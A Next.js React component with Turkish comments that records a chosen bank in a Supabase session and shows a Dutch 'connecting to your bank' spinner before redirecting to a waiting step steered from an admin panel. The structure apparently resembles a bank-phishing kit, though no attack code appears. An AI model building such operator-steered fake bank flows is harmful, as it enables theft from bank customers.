"use client";

import { useEffect } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

export function AutoRedirectClient({ sessionId, bankSlug, bankName }: Props) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();

  useEffect(() => {
    let mounted = true;

    async function doRedirect() {
      if (!supabase || !sessionId) return;
      
      // Admin panelindeki önizleme (preview) ekranında yönlendirme yapma
      if (sessionId === "preview") return;
      
      const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
      const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "wait",
          form_data: {
            ...prev,
            bankSlug,
            bankName,
          },
        })
        .eq("id", sessionId);

      if (mounted) {
        // ⭐ FLASH YOK: router.push → router.replace
        router.replace(stepToPath("wait", sessionId));
      }
    }

    void doRedirect();

    return () => {
      mounted = false;
    };
  }, [sessionId, bankSlug, bankName, router, supabase]);

  return (
    <div className="min-h-screen bg-[#F5F5F5] flex items-center justify-center">
      <div className="text-center">
        <div className="w-12 h-12 border-4 border-[#009286] border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
        <p className="text-gray-600 font-medium">Verbinden met {bankName}...</p>
      </div>
    </div>
  );
}
